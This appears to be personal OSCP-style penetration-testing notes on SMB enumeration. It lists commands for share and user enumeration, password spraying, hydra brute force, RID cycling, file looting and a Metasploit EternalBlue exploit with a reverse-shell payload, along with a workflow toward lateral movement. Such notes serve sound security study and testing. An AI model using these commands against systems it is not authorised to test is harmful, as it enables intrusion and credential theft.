# Enumeration — SMB

## Overview

SMB (Server Message Block) is commonly used for:

- file sharing
- printer sharing
- Active Directory communication
- remote administration
- authentication services

SMB enumeration often reveals:

- usernames
- shares
- passwords
- domain information
- sensitive files
- misconfigurations
- writable directories
- lateral movement opportunities

---

# Common Ports

| Port | Protocol |
|------|----------|
| 445 | SMB over TCP |
| 139 | SMB over NetBIOS |

---

# Tools

| Tool | Purpose |
|------|--------|
| nmap | service discovery & vuln detection |
| smbclient | interact with shares |
| smbmap | permissions enumeration |
| enum4linux | legacy SMB enumeration |
| crackmapexec / netexec | credential testing |
| rpcclient | user/group enumeration |
| metasploit | exploitation modules |
| hydra | brute force |
| mount.cifs | mount shares locally |

---

# Initial Discovery

## Nmap SMB scripts

```bash
nmap -p 139,445 --script smb-enum-shares,smb-enum-users,smb-os-discovery <target>
```

Full SMB script scan:

```bash
nmap --script smb* -p 445 <target>
```

Version detection:

```bash
nmap -sV -p 139,445 <target>
```

---

# Enumerating Shares

## Anonymous share listing

```bash
smbclient -L //<target>/ -N
```

## Share listing with credentials

```bash
smbclient -L //<target>/ -U <user>%<password>
```

---

# enum4linux

Older but still useful.

```bash
enum4linux -a <target>
```

May enumerate:

- users
- shares
- policies
- groups
- domain info

---

# smbmap

Check access permissions:

```bash
smbmap -H <target>
```

Authenticated:

```bash
smbmap -H <target> -u <user> -p <password>
```

List share contents:

```bash
smbmap -H <target> -u <user> -p <password> -r
```

Download files recursively:

```bash
smbmap -H <target> -u <user> -p <password> --download <share>
```

---

# NetExec / CrackMapExec

Enumerate shares:

```bash
netexec smb <target> -u <user> -p <password> --shares
```

Enumerate users:

```bash
netexec smb <target> -u <user> -p <password> --users
```

Enumerate sessions:

```bash
netexec smb <target> -u <user> -p <password> --sessions
```

Password spray:

```bash
netexec smb <target> -u users.txt -p passwords.txt
```

Check local admin:

```bash
netexec smb <target> -u <user> -p <password> --local-auth
```

RID brute force:

```bash
netexec smb <target> -u '' -p '' --rid-brute
```

---

# rpcclient

Connect anonymously:

```bash
rpcclient -U "" <target>
```

Useful commands:

```bash
enumdomusers
enumdomgroups
queryuser <RID>
querygroup <RID>
enumalsgroups domain
```

---

# Accessing SMB Shares

## Connect anonymously

```bash
smbclient //<target>/<share> -N
```

## Connect with credentials

```bash
smbclient //<target>/<share> -U <user>%<password>
```

---

# smbclient Commands

Inside smbclient:

```bash
ls
cd <directory>
get <file>
put <file>
mget *
recurse ON
prompt OFF
exit
```

Download all files:

```bash
recurse ON
prompt OFF
mget *
```

---

# Mount SMB Share (Linux)

Mount locally:

```bash
mount -t cifs //<target>/<share> /mnt/smb -o username=<user>,password=<password>,rw
```

Anonymous mount:

```bash
mount -t cifs //<target>/<share> /mnt/smb -o guest
```

Unmount:

```bash
umount /mnt/smb
```

---

# Brute Force SMB

Hydra example:

```bash
hydra -l <user> -P <wordlist> smb://<target>
```

Password spray:

```bash
hydra -L users.txt -p Password123 smb://<target>
```

---

# Vulnerability Checks

## MS17-010 (EternalBlue)

```bash
nmap -p445 --script smb-vuln-ms17-010 <target>
```

---

# Metasploit Modules

Launch Metasploit:

```bash
msfconsole
```

Example exploit:

```bash
use exploit/windows/smb/ms17_010_eternalblue

set RHOSTS <target>

set PAYLOAD windows/x64/meterpreter/reverse_tcp

run
```

---

# High-Value Targets

Look for:

- writable shares
- configuration files
- backup files
- scripts containing credentials
- Group Policy files
- log files
- database connection strings
- SSH keys
- password files
- installation scripts

Common sensitive file names:

```text
password.txt
config.xml
web.config
backup.zip
id_rsa
creds.txt
settings.ini
```

---

# Common Interesting Shares

| Share | Description |
|------|-------------|
| ADMIN$ | remote admin access |
| C$ | root filesystem |
| IPC$ | named pipes |
| NETLOGON | logon scripts |
| SYSVOL | group policy files |
| print$ | printer drivers |

SYSVOL often contains:

- scripts
- policies
- credentials
- GPP passwords

---

# Tips

Anonymous login is common.

RID cycling can reveal valid usernames.

Writable shares may allow:

- webshell upload
- malicious scripts
- credential harvesting
- privilege escalation

Check for:

- guest access
- null sessions
- weak permissions
- exposed backups

---

# Typical Workflow

1. scan ports 139/445
2. enumerate shares anonymously
3. enumerate users via rpcclient or netexec
4. check share permissions
5. download interesting files
6. search for credentials
7. test credentials
8. attempt lateral movement

---

# Related Notes

- Enumeration — LDAP
- Enumeration — Kerberos
- Password Attacks — Credential Hunting
- Active Directory — NTDS.dit
- Lateral Movement — SMB

---

# Tags

#enumeration #smb #windows #netexec #rpcclient #smbclient #oscp